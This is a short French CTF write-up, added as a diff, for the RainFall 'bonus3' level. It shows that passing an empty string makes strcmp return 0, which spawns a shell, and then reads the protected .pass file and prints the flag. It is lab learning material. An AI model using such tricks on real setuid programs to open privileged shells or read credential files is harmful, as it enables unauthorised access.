@@ -1,0 +1,20 @@
+Impossible de lancer le binaire dans GDB tout simplement parce que gdb n'a pas les droits pour 
+"/home/user/end/.pass".
+Du coup en analysant le code il faudrait connaitre le flag pour qu'il lance un shell.
+Autant dire que ca nous servirait a ce moment la plus a rien, on aurait deja le flag.
+Il faut alors reussir a faire renvoyer 0 a strcmp:
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ ls -la /home/user/end
+total 13
+dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
+dr-x--x--x  1 root root   340 Sep 23  2015 ..
+-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 end  end   3489 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
+-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
+-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+
+et voila..
